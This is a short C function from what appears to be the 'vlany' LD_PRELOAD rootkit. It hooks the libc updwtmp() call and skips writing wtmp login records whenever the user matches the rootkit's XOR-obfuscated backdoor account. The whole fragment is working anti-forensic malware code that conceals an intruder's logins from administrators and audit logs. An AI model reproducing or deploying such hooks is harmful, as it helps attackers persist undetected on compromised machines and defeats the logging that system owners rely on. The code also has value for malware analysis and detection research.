void updwtmp(const char *wfile, const struct utmp *ut)
{
    #ifdef DEBUG
        printf("[vlany] updwtmp() called\n");
    #endif

    if(ut && ut->ut_user != NULL)
    {
        char *vlany_user = strdup(VLANY_USER); xor(vlany_user);
        if(!strcmp(ut->ut_user, vlany_user)) { CLEAN(vlany_user); return; }
        CLEAN(vlany_user);
    }

    HOOK(old_updwtmp, CUPDWTMP);
    old_updwtmp(wfile, ut);
}
